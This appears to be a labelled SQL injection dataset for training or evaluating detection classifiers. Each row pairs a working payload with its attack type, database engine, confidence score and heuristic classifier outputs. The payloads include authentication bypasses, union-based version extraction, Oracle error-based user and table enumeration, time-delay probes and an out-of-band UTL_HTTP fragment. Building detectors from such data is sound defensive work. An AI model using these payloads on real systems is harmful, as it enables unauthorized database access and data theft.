payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,({ obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,158,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1"
1 ) or pg_sleep ( __TIME__ ) --,time_blind,postgresql,0.95,pg_sleep for PostgreSQL time blind SQLi,KEEP,,time_blind,postgresql,159,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,benign,generic,no SQLi signal in heuristic check,1 ) or pg_sleep ( __TIME__ ) --
"select * from users where id = 1 or ""{."" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"{.\ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,160,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""{."" or 1 = 1 -- 1"
""" ) or sleep ( __TIME__ ) = """,time_blind,mysql,0.9,sleep() for MySQL time blind SQLi,KEEP,,time_blind,mysql,161,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,""" ) or sleep ( __TIME__ ) = """
select * from users where id = 1.<@. or 1 = 1 -- 1,boolean_blind,mysql,0.8,<@. for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,162,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1.<@. or 1 = 1 -- 1
"admin"" ) or ( ""1"" = ""1""--",auth_bypass,generic,0.9,"admin\\"") or (\""1\""=\""1\""-- for auth bypass""",KEEP,,auth_bypass,generic,163,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"admin"" ) or ( ""1"" = ""1""--"
"select * from users where id = 1<@.. union select 1,version ( ) -- 1",union_based,mysql,0.85,<@.. union select for union SQLi,KEEP,,union_based,mysql,164,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1<@.. union select 1,version ( ) -- 1"
"select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'",union_based,mysql,0.85,@ 1 + version() for union SQLi,KEEP,,union_based,mysql,165,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'"
select * from users where id = 1 + \+%1 or 1 = 1 -- 1,boolean_blind,mysql,0.8,\+%+1 for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,166,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 + \+%1 or 1 = 1 -- 1
"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,";1\ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,167,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "";1"" or 1 = 1 -- 1"
"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,%& obfuscation for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,168,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""%&"" or 1 = 1 -- 1"
1 and 1 = 1,boolean_blind,generic,0.95,1 and 1=1 for boolean blind SQLi,KEEP,,boolean_blind,generic,169,boolean_blind,generic,Pattern match: 'and 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 and 1 = 1
or 0 = 0 #,boolean_blind,generic,0.9,or 0=0 # is boolean blind SQLi,KEEP,,boolean_blind,generic,170,boolean_blind,generic,Pattern match: 'or 0 = 0' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 0 = 0 #
union select * from users where login = char ...,union_based,generic,0.8,UNION SELECT with char() encoding,KEEP,,union_based,generic,171,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,union select * from users where login = char ...
"select * from users where id = 1 union select 1||@,version ( ) -- 1",union_based,mysql,0.85,1||@ union select for union SQLi,KEEP,,union_based,mysql,172,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select 1||@,version ( ) -- 1"
admin' ) or '1' = '1'--,auth_bypass,generic,0.95,admin') or ('1'='1'-- for auth bypass,KEEP,,auth_bypass,generic,173,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,admin' ) or '1' = '1'--
"select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,{; obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,174,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""{;"" or 1 = 1 -- 1"
x' and 1 = ( select count ( * ) from tabname ) ; --,boolean_blind,generic,0.8,x' and 1=(select) is boolean blind SQLi,KEEP,,boolean_blind,generic,175,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,x' and 1 = ( select count ( * ) from tabname ) ; --
"select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'",union_based,mysql,0.8,"\\""<@ union select for union SQLi""",KEEP,,union_based,mysql,176,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'"
"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"?, obfuscation for boolean blind SQLi",KEEP,,boolean_blind,mysql,177,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""?,"" or 1 = 1 -- 1"
"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,0.95,||1 + v$version for Oracle union SQLi,KEEP,,union_based,oracle,178,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'"
"1 or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,benchmark + MD5 for time blind SQLi,KEEP,,time_blind,mysql,179,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 or benchmark ( 10000000,MD5 ( 1 ) ) #"
or '' = ',boolean_blind,generic,0.9,or '' = ' is boolean blind SQLi,KEEP,,boolean_blind,generic,180,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or '' = '
AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i,error_based,oracle,0.95,utl_inaddr + SYS.LOGIN_USER error SQLi,KEEP,,error_based,oracle,181,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + SYS.ALL_USERS error SQLi,KEEP,,error_based,oracle,182,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i"
"select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1",boolean_blind,mysql,0.8,\. ) for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,183,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1"
select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',boolean_blind,mysql,0.8,$ 1 for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,184,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1'
""" or """"^""",auth_bypass,generic,0.9,"\\"" or \""\""^\""\"" is quote escape auth bypass""",KEEP,,auth_bypass,generic,185,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,""" or """"^"""
"select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1",union_based,mssql,0.85,\< + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,186,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1"
"select * from users where id = 1 union select 1<@$,version ( ) -- 1",union_based,mysql,0.8,1<@$ union select for union SQLi,KEEP,,union_based,mysql,187,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select 1<@$,version ( ) -- 1"
"select * from users where id = 1 *\ union select null,@@VERSION -- 1",union_based,mssql,0.85,*\ + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,188,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 *\ union select null,@@VERSION -- 1"
"select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'",union_based,mysql,0.85,!<@ + version() for union SQLi,KEEP,,union_based,mysql,189,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'"
"select * from users where id = 1 or "".%"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,".%\ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,190,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "".%"" or 1 = 1 -- 1"
admin'/*,auth_bypass,mysql,0.95,admin'/* is MySQL auth bypass,KEEP,,auth_bypass,mysql,191,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,admin'/*
"select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"( #\ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,192,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1"
||UTL_HTTP.REQUEST,out_of_band,oracle,0.9,UTL_HTTP.REQUEST for Oracle OOB,KEEP,,out_of_band,oracle,193,out_of_band,generic,Pattern match: 'utl_http' → out_of_band (P6); DB signature: generic,out_of_band,generic,OOB file/network function,||UTL_HTTP.REQUEST
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",error_based,oracle,0.95,utl_inaddr + sys.all_tables error SQLi,KEEP,,error_based,oracle,194,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 1 ) ) AND 'i' = 'i"
"select * from users where id = '1'<@.. union select 1,version ( ) -- 1'",union_based,mysql,0.85,<@.. union select for union SQLi,KEEP,,union_based,mysql,195,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1'<@.. union select 1,version ( ) -- 1'"
""" ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,benchmark + MD5 for time blind SQLi,KEEP,,time_blind,mysql,196,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),""" ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #"
"select * from users where id = 1 <@.$ union select 1,version ( ) -- 1",union_based,mysql,0.85,<@.$ union select for union SQLi,KEEP,,union_based,mysql,197,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 <@.$ union select 1,version ( ) -- 1"
"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",union_based,mssql,0.85,$ . + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,198,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1"
select * from users where id = '1' <@.$ or 1 = 1 -- 1',boolean_blind,mysql,0.8,<@.$ for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,199,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = '1' <@.$ or 1 = 1 -- 1'
